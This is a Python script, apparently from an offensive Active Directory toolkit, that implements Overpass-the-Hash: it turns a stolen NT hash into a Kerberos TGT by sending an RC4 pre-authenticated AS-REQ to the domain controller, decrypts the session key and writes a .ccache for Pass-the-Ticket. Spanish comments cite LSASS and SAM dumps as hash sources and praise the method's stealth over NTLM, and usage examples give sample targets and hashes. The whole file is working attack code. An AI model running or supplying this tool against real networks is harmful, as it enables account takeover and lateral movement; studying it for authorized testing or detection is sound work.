# scripts/kerberos/tickets/overpass_the_hash.py
#
# Técnica: Overpass-the-Hash (OPtH) / Pass-the-Key
#
# Fundamento:
#   Pass-the-Hash funciona para NTLM: usas el NT hash directamente como
#   autenticación. Pero en redes con NTLMv1/v2 deshabilitado o monitorizadas,
#   necesitas Kerberos.
#
#   Overpass-the-Hash convierte un NT hash en un TGT de Kerberos:
#     1. Construye PA-ENC-TIMESTAMP cifrado con el NT hash (clave RC4-HMAC).
#     2. Envía AS-REQ con ese timestamp al KDC.
#     3. El KDC responde con AS-REP (el TGT cifrado).
#     4. Descifra el enc-part del AS-REP con el NT hash → extrae session key.
#     5. Guarda TGT + session key en un .ccache → Pass-the-Ticket.
#
#   La diferencia entre este script y un login normal es que aquí partimos
#   de un HASH, no de una contraseña. El hash puede venir de:
#     - secretsdump / crackmapexec / mimikatz (dump de SAM o LSASS)
#     - Kerberoasting exitoso + crackeo
#     - AS-REP Roasting exitoso + crackeo
#
#   Por qué es más sigiloso que NTLM:
#     Genera tráfico Kerberos (puerto 88) en vez de SMB/NTLM,
#     que está más monitorizado en entornos modernos.

import os
from scripts.base import BaseScript
from core.kerberos_transport import send_krb_message, check_kdc_reachable
from core.asn1_helpers import (
    build_as_req, build_pa_data, build_enc_timestamp,
    parse_as_rep_ticket, decrypt_as_rep_enc_part_rc4,
    is_as_rep, is_krb_error, parse_krb_error,
    nt_hash as compute_nt_hash,
    ETYPE_RC4_HMAC, PA_ENC_TIMESTAMP,
    KDC_ERR_PREAUTH_REQUIRED,
)
from core.output import print_result, console
from core import session_db


class OverpassTheHashScript(BaseScript):
    name = "overpass-the-hash"
    description = "NT hash → TGT Kerberos (.ccache) — convierte un hash en identidad Kerberos"

    examples = [
        {"flag": "-H / --hash",
         "desc": "NT hash (o LM:NT) del usuario. El hash se convierte en TGT vía AS-REQ RC4-HMAC.",
         "good": "kerberos --script=overpass-the-hash -t 10.129.1.5 -d CORP.LOCAL -u jsmith -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
         "bad": "kerberos --script=overpass-the-hash -t 10.129.1.5 -d CORP.LOCAL -H 8846f7eaee8fb117ad06bdd830b7586c  [sin -u no sabe qué cuenta autenticar]"},
        {"flag": "-p / --password",
         "desc": "También funciona con contraseña (la convierte a NT hash internamente)",
         "good": "kerberos --script=overpass-the-hash -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!'",
         "bad": "kerberos --script=overpass-the-hash -t 10.129.1.5 -d CORP.LOCAL -u jsmith  [sin -p o -H no hay con qué cifrar el PA-ENC-TIMESTAMP]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        kdc = self.target.ip

        if not self.creds.user:
            console.print("[red]Falta -u.[/red]"); return
        if not realm:
            console.print("[red]Falta -d/--domain.[/red]"); return
        if not self.creds.password and not self.creds.hash:
            console.print("[red]Falta -p o -H.[/red]"); return

        if not check_kdc_reachable(kdc, timeout=self.target.timeout):
            print_result("KRB", kdc, "fail", "KDC no alcanzable en :88"); return

        # Obtener el NT hash a usar como clave
        if self.creds.hash:
            nt = bytes.fromhex(self.creds.hash.split(":")[-1])
        else:
            nt = compute_nt_hash(self.creds.password)

        print_result("KRB", kdc, "info",
                     f"overpass-the-hash: {self.creds.user}@{realm} "
                     f"NT={nt.hex()[:16]}...")

        # Paso 1: intentar sin pre-auth
        req = build_as_req(self.creds.user, realm, etypes=[ETYPE_RC4_HMAC])
        try:
            resp = send_krb_message(kdc, req, timeout=self.target.timeout)
        except OSError as e:
            print_result("KRB", kdc, "fail", str(e)); return

        if is_krb_error(resp):
            err = parse_krb_error(resp)
            if err['error_code'] != KDC_ERR_PREAUTH_REQUIRED:
                print_result("KRB", kdc, "fail",
                             f"Error inesperado: {err['error_name']}"); return

        # Paso 2: construir PA-ENC-TIMESTAMP con el NT hash
        ts_enc = build_enc_timestamp(
            self.creds.password if self.creds.password else None,
            _nt_override=nt
        )
        pa_list = [build_pa_data(PA_ENC_TIMESTAMP, ts_enc)]
        req2 = build_as_req(self.creds.user, realm,
                             etypes=[ETYPE_RC4_HMAC], pa_data_list=pa_list)
        try:
            resp2 = send_krb_message(kdc, req2, timeout=self.target.timeout)
        except OSError as e:
            print_result("KRB", kdc, "fail", str(e)); return

        if not is_as_rep(resp2):
            if is_krb_error(resp2):
                err = parse_krb_error(resp2)
                print_result("KRB", kdc, "fail",
                             f"KDC rechazó la pre-auth: {err['error_name']} — "
                             f"¿hash incorrecto?")
            return

        # Paso 3: descifrar enc-part con el NT hash → session key
        try:
            enc_info = decrypt_as_rep_enc_part_rc4(resp2, nt)
            session_key = enc_info['session_key']
        except Exception as e:
            print_result("KRB", kdc, "fail", f"No se pudo descifrar enc-part: {e}")
            return

        # Paso 4: guardar TGT como .ccache via impacket
        ticket_info = parse_as_rep_ticket(resp2)
        out_path = self._save_ccache(resp2, ticket_info, session_key, realm)

        if out_path:
            os.environ['KRB5CCNAME'] = f'FILE:{out_path}'
            print_result("KRB", kdc, "pwned",
                         f"TGT obtenido para {self.creds.user}@{realm}")
            console.print(f"[green]Ticket guardado: [bold]{out_path}[/bold][/green]")
            console.print(f"[green]KRB5CCNAME activado para esta sesión[/green]")
            console.print(f"  export KRB5CCNAME=FILE:{out_path}")
            session_db.save_finding(kdc, "KRB", "tgt_obtained",
                                     f"{self.creds.user}@{realm} → {out_path}")
            return {'ccache': out_path, 'session_key': session_key.hex()}
        else:
            print_result("KRB", kdc, "ok",
                         f"TGT obtenido pero no se pudo guardar como .ccache "
                         f"(impacket no disponible)")

    def _save_ccache(self, as_rep_data, ticket_info, session_key, realm) -> str | None:
        try:
            from impacket.krb5.ccache import CCache
            from impacket.krb5.asn1 import AS_REP
            from pyasn1.codec.der import decoder as der_dec
            ccache = CCache()
            ccache.fromASREP(as_rep_data)
            out = f"/tmp/{self.creds.user}_{realm}.ccache"
            ccache.saveFile(out)
            return out
        except Exception:
            # Guardar raw bytes del AS-REP para uso manual
            out = f"/tmp/{self.creds.user}_{realm}.asrep"
            with open(out, 'wb') as f:
                f.write(as_rep_data)
            return None
